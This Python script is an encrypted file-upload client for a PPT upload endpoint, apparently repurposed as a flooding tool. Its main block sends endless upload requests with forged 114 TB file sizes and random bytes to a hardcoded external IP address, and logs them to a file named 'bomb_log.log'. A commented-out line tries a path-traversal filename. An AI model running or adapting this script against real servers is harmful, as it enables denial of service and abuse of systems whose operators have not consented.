import sys
import os
import time
import requests
import uuid
import hashlib
import traceback
import logging
import random
import string
import threading
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urljoin
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5 as PKCS1_cipher
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad

global logger


def size_to_str(size: int) -> str:
    if size < 1024:
        return str(size) + " B"
    if size < 1024 * 1024:
        return str(round(size / 1024, 2)) + " KB"
    if size < 1024 * 1024 * 1024:
        return str(round(size / 1024 / 1024, 2)) + " MB"
    if size < 1024 * 1024 * 1024 * 1024:
        return str(round(size / 1024 / 1024 / 1024, 2)) + " GB"
    if size < 1024 * 1024 * 1024 * 1024 * 1024:
        return str(round(size / 1024 / 1024 / 1024 / 1024, 2)) + " TB"
    if size < 1024 * 1024 * 1024 * 1024 * 1024 * 1024:
        return str(round(size / 1024 / 1024 / 1024 / 1024 / 1024, 2)) + " PB"


class UploadFile(object):
    def __init__(self, url: str, filepath: str) -> None:
        self.url = url

        self.file_path = filepath

        if not os.path.exists(filepath):
            logger.critical("File path invalid.")
            logger.error(f"Program EXIT abnormally ======\n\n\n")
            sys.exit()

        self.filename = os.path.basename(self.file_path)
        self.filesize = os.path.getsize(self.file_path)
        with open(filepath, 'rb') as f:
            self.file_content = f.read()
        logger.info("Read file: success.")

        if self.filesize >= 1024 ** 2 * 256:
            logger.critical("File size larger than 256 MB.")
            logger.critical("This file cannot be uploaded.")
            self.file_uuid = uuid.uuid4()
            self.cache_file()
            logger.error(f"Program EXIT abnormally ======\n\n\n")
            sys.exit()

        self.timestamp = int(time.time())
        self.aes_key = None
        self.public_key = None
        self.encrypted_file_content = None
        self.iv = None

    def generate_aes_key(self) -> None:
        self.aes_key = get_random_bytes(32)
        logger.info("Generate AES Key: success.")

    def encrypt_aes_key(self) -> bytes:
        # 使用RSA公钥加密AES密钥
        cipher = PKCS1_cipher.new(RSA.import_key(self.public_key))
        encrypted_aes_key = cipher.encrypt(self.aes_key)
        logger.info("Encrypt AES Key with RSA public key: success.")
        return encrypted_aes_key

    def encrypt_aes_iv(self) -> bytes:
        # 使用RSA公钥加密AES密钥
        cipher = PKCS1_cipher.new(RSA.import_key(self.public_key))
        encrypted_aes_iv = cipher.encrypt(self.iv)
        logger.info("Encrypt AES IV with RSA public key: success.")
        return encrypted_aes_iv

    def encode_filename(self) -> None:
        self.encoded_filename = []
        for char in self.filename:
            self.encoded_filename.append(ord(char) ^ (self.timestamp % 2048))
        logger.info("Encode filename: success.")

    def upload_file_data(self) -> None:
        self.file_uuid = str(uuid.uuid4())
        file_hash = hashlib.md5(self.file_content).hexdigest()
        logger.info(
            f"Sending file data to the server...\nFilename: {self.filename[:1] + '*****' + self.filename[-1:]}\nEncoded Filename: {self.encoded_filename}\nFile size: {size_to_str(self.filesize)}\nFile hash: {file_hash}\nFile UUID: {self.file_uuid}")
        data = {
            "file_uuid": self.file_uuid,
            "file_hash": file_hash,
            "file_name": self.encoded_filename,
            "file_size": size_to_str(self.filesize),
            "timestamp": self.timestamp
        }

        t1 = time.time()
        try:
            response = requests.post(urljoin(self.url, "upload_file_data"), json=data)
        except Exception as e:
            logger.critical("Send file data: fail (cannot send request)")
            logger.error(f"Content: \n{traceback.format_exc()}")
            self.cache_file()
            logger.error(f"Program EXIT abnormally ======\n\n\n")
            sys.exit()
        t2 = time.time()

        try:
            tmp = response.json()
            del tmp
        except Exception as e:
            logger.critical("Send file data: fail (cannot parse response)")
            logger.error(f"Text: \n{response.text}")
            self.cache_file()
            logger.error(f"Program EXIT abnormally ======\n\n\n")
            sys.exit()

        logger.info(f"Send file: success. (Used {round(t2 - t1, 2)} sec)")
        logger.info(f"Response: Code {response.status_code} - {response.json()}")
        response = response.json()
        if not response["upload_file"]:
            logger.info("Server rejected file.")
            logger.info(f"Program EXIT normally ======\n\n\n")
            sys.exit(0)

        self.public_key = response["public_key"]
        logger.info(f"Get RSA Public key: success.")
        logger.info(f"RSA Public key (Decoded):\n{self.public_key}")

    def encrypt_file(self) -> None:
        logger.info("Encrypting file with AES...")
        # iv = get_random_bytes(AES.block_size)
        aes_cipher = AES.new(self.aes_key, AES.MODE_CBC)
        padded_file_content = pad(self.file_content, AES.block_size)
        self.encrypted_file_content = aes_cipher.encrypt(padded_file_content)
        self.iv = aes_cipher.iv
        logger.info("Encrypt file: success.")

    def cache_file(self) -> None:
        logger.info("Now saving file into cache folder.")
        logger.info(f"For safety reasons, filename will be: {self.file_uuid}")
        logger.info(f"Original filename: {self.filename}")
        if not os.path.exists("cache/"):
            os.makedirs("cache")
        with open(f"cache/{self.file_uuid}", "wb") as f:
            f.write(self.file_content)

    def send_file(self) -> None:
        logger.info("Sending file to the server...")
        # logger.info(self.iv)
        # 发送加密的AES密钥和文件
        multipart_data = MultipartEncoder(
            fields={
                'aes_key': ('aes_key', self.encrypt_aes_key(), 'application/octet-stream'),
                'aes_iv': ('aes_iv', self.encrypt_aes_iv(), 'application/octet-stream'),
                'files': (self.file_uuid, self.encrypted_file_content, 'application/octet-stream')
            }
        )
        t1 = time.time()
        try:
            response = requests.post(urljoin(self.url, "upload_ppt"), data=multipart_data,
                                     headers={'Content-Type': multipart_data.content_type})
        except Exception as e:
            logger.critical("Send file data: fail (cannot send request)")
            logger.error(f"Content: \n{traceback.format_exc()}")
            self.cache_file()
            logger.error(f"Program EXIT abnormally ======\n\n\n")
            sys.exit()
        t2 = time.time()
        try:
            tmp = response.json()
            del tmp
        except Exception as e:
            logger.critical("Send file data: fail (cannot parse response)")
            logger.error(f"Text: \n{response.text}")
            self.cache_file()
            logger.error(f"Program EXIT abnormally ======\n\n\n")
            sys.exit()

        logger.info(f"Send file: success. (Used {round(t2 - t1, 2)} sec)")
        logger.info(f"Response: Code {response.status_code} - {response.json()}")

    def run(self) -> None:
        self.encode_filename()
        self.upload_file_data()
        self.generate_aes_key()
        self.encrypt_file()
        self.send_file()


def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))


def generate_random_bytes(length):
    return bytes([random.randint(0, 255) for _ in range(length)])


def create_rand_task():
    while True:
        rnd_url = random.choice(
            ["http://180.166.0.98:1458/upload_file/"])
        file_path = "test/1b.dat"
        uf_obj = UploadFile(rnd_url, file_path)
        # uf_obj.filename = generate_random_string(20)+"."+generate_random_string(4)
        # uf_obj.filename = "../test.txt"
        uf_obj.filesize = 1099511627776 * 114
        uf_obj.file_content = generate_random_bytes(3)
        uf_obj.run()


if __name__ == "__main__":
    try:
        # os.popen(f"start powerpnt.exe -C \"{file_path}\"")
        script_dir = os.path.dirname(os.path.realpath(__file__))
        os.chdir(script_dir)
        logging.basicConfig(level=logging.INFO,
                            format='[%(asctime)s %(levelname)s] %(message)s',
                            filename='bomb_log.log',
                            filemode='a')
        logger = logging.getLogger()

        for i in range(8):
            threading.Thread(target=create_rand_task).run()

        logger.info(f"Program EXIT normally ======\n\n\n")
    except Exception as e:
        try:
            logger.fatal("Exception caught.")
            logger.fatal(f"Content: \n{traceback.format_exc()}")
            logger.error(f"Program EXIT abnormally ======\n\n\n")
        except Exception as e:
            sys.exit()
